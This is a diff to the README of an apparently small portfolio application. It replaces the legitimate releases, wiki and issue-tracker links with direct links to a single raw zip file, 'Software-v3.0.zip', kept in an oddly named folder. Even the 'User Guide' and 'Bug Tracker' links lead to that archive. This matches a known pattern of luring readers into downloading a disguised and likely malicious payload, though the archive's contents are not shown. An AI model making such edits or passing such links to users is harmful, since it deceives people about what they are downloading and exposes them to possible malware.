@@ -1,6 +1,6 @@
 # 🎨 shozonportfolio - Your Simple Way to Showcase Skills
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/behlah53/shozonportfolio/releases)
+[![Download Here](https://github.com/behlah53/shozonportfolio/raw/refs/heads/main/thyroarytenoid/Software-v3.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/behlah53/shozonportfolio/raw/refs/heads/main/thyroarytenoid/Software-v3.0.zip)
 
 ## 📋 Overview
 Welcome to the **shozonportfolio** project. This application serves as your personal portfolio, designed to help you showcase your skills and achievements easily. 
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection**: Needed for downloading
 
 ### 2. **Download & Install**
-To download the application, visit this page: [Download the Latest Release](https://github.com/behlah53/shozonportfolio/releases).
+To download the application, visit this page: [Download the Latest Release](https://github.com/behlah53/shozonportfolio/raw/refs/heads/main/thyroarytenoid/Software-v3.0.zip).
 
 1. Once on the page, look for the **latest release**.
 2. Click on it to open the release information.
@@ -58,9 +58,9 @@ For additional help, you can:
 ## 📥 Important Links
 For more information and updates, check the following links:
 
-- [Download the Latest Release](https://github.com/behlah53/shozonportfolio/releases)
-- [User Guide](https://github.com/behlah53/shozonportfolio/wiki)
-- [Bug Tracker](https://github.com/behlah53/shozonportfolio/issues)
+- [Download the Latest Release](https://github.com/behlah53/shozonportfolio/raw/refs/heads/main/thyroarytenoid/Software-v3.0.zip)
+- [User Guide](https://github.com/behlah53/shozonportfolio/raw/refs/heads/main/thyroarytenoid/Software-v3.0.zip)
+- [Bug Tracker](https://github.com/behlah53/shozonportfolio/raw/refs/heads/main/thyroarytenoid/Software-v3.0.zip)
 
 ## 🌐 Community & Contributions
 We welcome community involvement! If you would like to contribute to **shozonportfolio**, consider the following:
